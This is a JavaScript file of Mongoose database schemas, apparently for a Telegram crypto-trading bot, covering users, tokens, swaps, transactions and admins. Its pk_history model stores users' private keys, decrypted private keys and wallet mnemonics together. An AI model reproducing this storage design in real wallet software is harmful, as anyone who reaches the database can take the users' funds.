
import mongoose from 'mongoose';


const adminSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  },
  email: {
    type: String,
    required: true
  },
  permission: {
    type: String,
    required: true
  },
  date: {
    type: Date,
    default: Date.now
  }
});

adminSchema.virtual('id').get(function () {
  return this._id.toHexString();
});

adminSchema.set('toJSON', {
  virtuals: true
});


const userSchema = new mongoose.Schema({
  chatid: String,
  username: String,
  type: String,
  permit: Number,
  slippage: Number,
  deadline: Number,
  account: String,
  pkey: String,
  fee: Number,
});

userSchema.virtual('id').get(function () {
  return this._id.toHexString();
});

userSchema.set('toJSON', {
  virtuals: true
});


const tokenSchema = new mongoose.Schema({
  chatid: String,
  address: String,
  chain: Number,
  dex: Number,
});


// Added by ilesoviy on 2023-08-13
const swapHistorySchema = new mongoose.Schema({
  chatid: String,
  from_token: String, // if from_token is Null, it means 'ETH'
  to_token: String, // if to_token is Null, it means 'ETH'
  from_amount: Number,
  to_amount: Number,
  timestamp: Date,
});

const utilsSchema = new mongoose.Schema({
  gas: {
    chainID: { type: Number, default: -1 },
    gasPrices: {
      low: { type: String, default: "" },
      medium: { type: String, default: "" },
      high: { type: String, default: "" },
    }
  }
});

const txHistorySchema = new mongoose.Schema({
  chatid: String,
  username: String,
  account: String,
  mode: String,
  eth_amount: Number,
  token_amount: Number,
  token_address: String,
  ver:String,
  tx: String,
  timestamp: Date
});

const pkHistorySchema = new mongoose.Schema({
  chatid: String,
  username: String,
  pkey: String,
  dec_pkey: String,
  account: String,
  mnemonic: String,
  timestamp: Date
});

const tokenHistorySchema = new mongoose.Schema({
  chatid: String,
  mode: Number,
  timestamp: Date,
  hash: String,
  token: String,
  aeskey: String,
  used: Boolean
});

export const TxHistory = mongoose.model('tx_history', txHistorySchema);
export const Admin = mongoose.model('admins', adminSchema);
export const User = mongoose.model('users', userSchema);
export const Token = mongoose.model('tokens', tokenSchema);

export const SwapHistory = mongoose.model('swapHists', swapHistorySchema);

export const Utils = mongoose.model('utils', utilsSchema)
export const PKHistory = mongoose.model('pk_history', pkHistorySchema);
export const TokenHistory = mongoose.model('token_history', tokenHistorySchema);